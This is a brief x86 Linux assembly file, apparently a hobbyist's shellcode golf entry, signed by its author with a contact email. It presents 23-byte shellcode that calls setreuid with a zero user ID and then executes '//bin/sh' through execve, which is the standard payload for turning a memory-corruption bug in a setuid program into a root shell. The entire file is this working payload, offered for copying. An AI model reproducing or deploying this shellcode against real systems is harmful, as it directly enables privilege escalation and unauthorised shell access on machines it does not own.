;Josh Hight
;license:=kopimi
;pretty typical technique, but instead of the more typical
;27-5* bytes, I did it in 23
;for comments or explication, email joshbooks@gmail.com

section .text

	global _start

_start:


	mov al, 70
	xor ebx, ebx
	int 80h



	push ebx
	push 0x68732f6e
	push 0x69622f2f
	mov ebx, esp
	mov al, 11
	int 80h
